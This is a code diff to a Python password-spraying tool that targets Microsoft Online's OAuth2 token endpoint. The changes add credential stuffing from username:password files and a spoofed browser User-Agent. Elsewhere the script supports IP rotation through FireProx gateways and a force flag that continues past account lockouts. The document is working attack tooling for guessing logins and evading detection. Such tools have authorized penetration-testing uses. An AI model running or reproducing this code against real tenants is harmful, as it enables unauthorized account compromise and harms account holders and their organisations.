@@ -324,8 +324,9 @@ This command uses the specified FireProx URL to spray from randomized IP address
 
 parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
 
-parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
-parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
+parser.add_argument("-u", "--userlist", metavar="FILE", help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required if --userpass is not used)")
+parser.add_argument("-p", "--password", help="A single password that will be used to perform the password spray. (Required if --userpass is not used)")
+parser.add_argument("-up", "--userpass", metavar="FILE", help="File filled with username:password combinations, one per line (e.g. user@domain.com:password). (Either this or --userlist and --password are required)")
 parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
@@ -334,28 +335,47 @@ parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many 
 
 args = parser.parse_args()
 
-password = args.password
+# Check for userpass or fallback to userlist/password
+if args.userpass:
+    with open(args.userpass, "r") as userpass_file:
+        userpass_list = userpass_file.read().splitlines()
+    credentials = [line.split(":") for line in userpass_list]
+elif args.userlist and args.password:
+    with open(args.userlist, "r") as userlist:
+        usernames = userlist.read().splitlines()
+    password = args.password
+    credentials = [(username, password) for username in usernames]
+else:
+    print("ERROR: Either --userlist and --password or --userpass must be provided.")
+    exit(1)
+
+if args.url == "https://login.microsoft.com":
+    choice = input("URL is not set, this will get you locked out. Are you sure you want to proceed? (y/n): ").lower()
+    if choice != 'y':
+        print("Aborting the operation.")
+        exit(1)
+
+
 url = args.url
 force = args.force
 out = args.out
 verbose = args.verbose
 sleep = args.sleep
 
-usernames = []
-with open(args.userlist, "r") as userlist:
-    usernames = userlist.read().splitlines()
-
-username_count = len(usernames)
-
-print(f"There are {username_count} users in total to spray,")
+print(f"There are {len(credentials)} credentials to spray.")
 print("Now spraying Microsoft Online.")
 print(f"Current date and time: {time.ctime()}")
 
 results = ""
-username_counter = 0
 lockout_counter = 0
 lockout_question = False
-for username in usernames:
+username_counter = 0
+username_count = len(credentials)
+
+for username, password in credentials:
+
+    if args.verbose:
+        print(f"Trying {username} : {password}...")
 
     if username_counter>0 and sleep>0:        
         time.sleep(sleep)
@@ -376,6 +396,7 @@ for username in usernames:
     headers = {
         'Accept': 'application/json',
         'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36'
     }
 
     r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
